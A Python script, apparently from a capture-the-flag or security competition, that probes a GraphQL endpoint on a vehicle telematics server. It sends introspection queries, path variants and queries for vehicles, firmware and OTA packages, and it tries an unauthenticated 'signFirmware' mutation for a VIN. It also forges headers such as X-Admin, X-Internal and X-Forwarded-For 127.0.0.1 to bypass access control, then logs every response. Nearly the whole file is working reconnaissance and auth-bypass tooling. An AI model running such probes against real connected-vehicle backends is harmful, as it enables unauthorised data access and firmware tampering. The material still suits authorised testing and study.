#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GraphQL 真身测试 —— TSP 10.230.164.2:8080"""
import socket, json, time, sys, os

HOST = "10.230.164.2"; PORT = 8080
OUT = sys.argv[1] if len(sys.argv) > 1 else r"D:\qwb\03_EVIDENCE\tsp_s09"

def raw(req, timeout=8.0):
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((HOST, PORT)); s.sendall(req)
        buf = b""
        while True:
            try: c = s.recv(65536)
            except socket.timeout: break
            if not c: break
            buf += c
            if len(buf) > 100000: break
        return buf
    except Exception as e:
        return b"ERR:" + str(e).encode()
    finally:
        try: s.close()
        except Exception: pass

def req(method, path, ctype=None, body=b"", extra=None):
    h = {"Host": f"{HOST}:{PORT}"}
    if ctype: h["Content-Type"] = ctype
    if extra: h.update(extra)
    h["Content-Length"] = str(len(body))
    h["Connection"] = "close"
    out = f"{method} {path} HTTP/1.1\r\n".encode()
    for k, v in h.items(): out += f"{k}: {v}\r\n".encode()
    return out + b"\r\n" + body

CASES = []
def add(name, method, path, ctype=None, body=b"", extra=None):
    CASES.append((name, method, path, ctype, body, extra))

# 1) introspection over JSON
intro = '{"query":"query IntrospectionQuery { __schema { types { name kind } } }"}'
add("introspect_json", "POST", "/graphql", "application/json", intro.encode())
add("introspect_min", "POST", "/graphql", "application/json", b'{"query":"{__schema{types{name}}}"}')
add("typename", "POST", "/graphql", "application/json", b'{"query":"{__typename}"}')
# 2) application/graphql
add("graphql_ct", "POST", "/graphql", "application/graphql", b'{__schema{types{name}}}')
add("graphql_ct_query", "POST", "/graphql", "application/graphql", b'query{__typename}')
# 3) GET with query string
add("get_query", "GET", "/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D")
add("get_query2", "GET", "/graphql?query={__typename}")
# 4) path variants
for p in ["/graphql/", "/GraphQL", "/GRAPHQL", "/graphql/v1", "/graphql/v2", "/api/graphql",
          "/v1/graphql", "/gql", "/graphiql", "/graphql/schema", "/graphql/introspection"]:
    add("path_" + p, "POST", p, "application/json", b'{"query":"{__typename}"}')
# 5) operationName / variables
add("opname", "POST", "/graphql", "application/json",
    json.dumps({"query": "query Q($v:String){vehicles(vin:$v){vin}}", "operationName": "Q",
                "variables": {"v": "CV6FF52FEE9EDDD86"}}).encode())
# 6) 带 VIN 参数的查询 —— 看是否按参数过滤
for q in [
    '{"query":"{ vehicles(vin:\\"CV6FF52FEE9EDDD86\\"){ vin label } }"}',
    '{"query":"{ vehicles { vin label firmware { version url } } }"}',
    '{"query":"{ firmware { name version url hash } }"}',
    '{"query":"{ otaPackages { name url } }"}',
    '{"query":"mutation { signFirmware(vin:\\"CV6FF52FEE9EDDD86\\"){ signature } }"}',
    '{"query":"{ __type(name:\\"Vehicle\\"){ name fields{ name } } }"}',
]:
    add("q:" + q[:40], "POST", "/graphql", "application/json", q.encode())
# 7) auth headers
for hn, hv in [("Authorization", "Bearer test"), ("X-API-Key", "test"),
               ("X-Vehicle-VIN", "CV6FF52FEE9EDDD86"), ("X-Admin", "1"),
               ("X-Internal", "true"), ("X-Forwarded-For", "127.0.0.1")]:
    add("hdr_" + hn, "POST", "/graphql", "application/json",
        b'{"query":"{ vehicles { vin label } }"}', {hn: hv})
# 8) bodies / malformed
add("empty_body", "POST", "/graphql", "application/json", b"")
add("empty_obj", "POST", "/graphql", "application/json", b"{}")
add("array", "POST", "/graphql", "application/json", b"[]")
add("form", "POST", "/graphql", "application/x-www-form-urlencoded", b"query=%7B__typename%7D")
add("text", "POST", "/graphql", "text/plain", b'{"query":"{__typename}"}')
add("noctype", "POST", "/graphql", None, b'{"query":"{__typename}"}')
add("null_query", "POST", "/graphql", "application/json", b'{"query":null}')
add("batch", "POST", "/graphql", "application/json",
    b'[{"query":"{__typename}"},{"query":"{vehicles{vin}}"}]')

def main():
    os.makedirs(OUT, exist_ok=True)
    f = open(os.path.join(OUT, "11_graphql_deep.txt"), "w", encoding="utf-8")
    f.write(f"# GraphQL deep probe  {time.strftime('%Y-%m-%dT%H:%M:%S')}  target {HOST}:{PORT}\n")
    bodies = {}
    for name, m, p, ct, body, extra in CASES:
        r = raw(req(m, p, ct, body, extra))
        head, _, b = r.partition(b"\r\n\r\n")
        line = head.split(b"\r\n")[0].decode("latin1") if head else "<empty>"
        txt = b.decode("latin1", "replace")
        bodies[name] = txt
        f.write(f"\n=== {name} ===\n{m} {p}  ct={ct}  extra={extra}\n--- req body ---\n"
                f"{body[:300].decode('latin1','replace')}\n--- resp ---\n{line}\n{txt[:800]}\n")
        f.flush()
        print(f"{name:22s} {line:30s} {txt[:100]!r}")
    # 唯一响应体统计
    f.write("\n\n=== 响应体去重 ===\n")
    uniq = {}
    for k, v in bodies.items(): uniq.setdefault(v, []).append(k)
    for v, ks in uniq.items():
        f.write(f"\n[{len(ks)}] {ks}\n{v[:400]}\n")
    f.close()
    print(f"\nunique bodies: {len(uniq)}")

main()
